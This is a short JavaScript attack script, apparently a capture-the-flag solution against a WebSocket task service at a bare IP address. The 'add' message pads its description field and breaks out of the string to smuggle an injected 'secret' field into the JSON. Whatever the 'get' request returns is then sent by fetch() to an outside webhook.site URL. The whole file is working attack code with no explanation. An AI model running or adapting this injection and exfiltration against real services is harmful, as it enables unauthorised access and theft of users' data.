const ws = new WebSocket(`ws://178.62.9.40:31123/ws`);
ws.onopen = () => {
    ws.send(JSON.stringify(
        {
             action: 'add',
              title: "1",
              description: "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\",\"secret\": \"73c12045f8de028073fdbe7931f2ff86\"}" 
    }));
    ws.send(JSON.stringify({ action: 'get' }))
}
ws.onmessage = async (msg) => {
    const data = JSON.parse(msg.data);
    if (data.success) {
        if (data.action === 'get') {
            fetch("https://webhook.site/1026e8f2-ab1c-44c9-8440-9b30c70169bb?param=" + JSON.stringify(data.tasks ))
        }
        else if (data.action === 'add') {
        }
    }
}
